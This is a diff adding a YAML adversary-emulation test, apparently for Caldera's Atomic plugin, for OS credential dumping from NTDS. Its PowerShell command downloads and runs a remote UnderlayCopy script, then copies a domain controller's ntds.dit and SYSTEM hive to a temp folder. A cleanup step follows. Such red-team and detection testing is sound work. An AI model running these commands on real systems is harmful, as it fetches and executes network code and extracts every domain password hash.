@@ -1,0 +1,29 @@
+---
+- id: ecafe539eb20dae33b4dd58141513be6
+  name: Copy NTDS in low level NTFS acquisition via fsutil
+  description: 'This test is intended to be run on a domain Controller.
+
+
+    UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping
+    protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry
+    hives, and other files that are normally inaccessible while Windows is running).
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: 'OS Credential Dumping: NTDS'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1
+          -UseBasicParsing); Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit
+          -DestinationFile C:\Windows\Temp\ntds.dit; Underlay-Copy -Mode Metadata
+          -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile C:\Windows\Temp\SYSTEM_HIVE'
+        payloads: []
+        cleanup: remove-item "C:\Windows\Temp\ntds.dit" -force -erroraction silentlycontinue;
+          remove-item "C:\Windows\Temp\SYSTEM_HIVE" -force -erroraction silentlycontinue
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
